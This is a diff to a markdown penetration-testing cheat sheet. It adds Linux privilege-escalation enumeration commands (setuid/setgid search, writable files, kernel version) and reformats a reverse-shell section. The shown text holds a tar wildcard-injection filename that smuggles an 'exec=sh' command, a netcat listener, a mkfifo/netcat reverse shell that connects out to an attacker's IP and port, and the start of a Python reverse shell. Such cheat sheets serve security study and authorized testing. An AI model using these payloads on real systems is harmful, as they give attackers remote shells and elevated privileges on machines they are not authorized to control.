@@ -395,16 +395,36 @@ Using vulnerability in 'convert' to execute arbitrary commands with privelege:
 If you want to exucute code with a tar command (e.g. backup cronjob) , rename file to backup as follows:
 `'--checkpoint-action=exec=sh file.sh'`
 
+#### find files with setuid / setgid / r+w permissions
+`> find <directory> -user root -perm -4000 -exec ls -ldb {} \; >/tmp/filename`
+or
+`> find / -perm +4000 -user root -type f -print`
+
+- find setgid permissions
+`> find / -perm +2000 -user root -type f -print`
+
+- find all writable files for current user
+`> find / -perm -o+w`
+
+#### gather system information
+- get current distribution
+`> lsb_release -a`
+
+- get current kernel version
+`> uname -r`
+or
+`> cat /proc/version`
+
 
 -----
 
 # reverse shells
 
 #### simple netcat reverse shell [sh]
-	> nc - lvp <port> -e /bin/bash
+`> nc - lvp <port> -e /bin/bash`
 
-	-  alternative way to get a reverse shell in case -e option is not available  
-	> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> <port> >/tmp/f
+-  alternative way to get a reverse shell in case -e option is not available 
+`> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> <port> >/tmp/f`
 
 #### reverse shell [py]
 	python -c 'import socket,subprocess,os;
@@ -442,14 +462,6 @@ If you want to exucute code with a tar command (e.g. backup cronjob) , rename fi
 #### string 
 - Show printable characters in files with at least 3 characters:
 `> strings -n 3 '/path/to/file1' '/path/to/file2'`
-
-#### lsb_release
-- show linux derivative / version
-`> lsb_release -a`
-
-#### find 
-- find all writable files for current user
-`> find / -perm -o+w`
 
 #### grep
 - filter certain file extention '.ext' in a 'file'
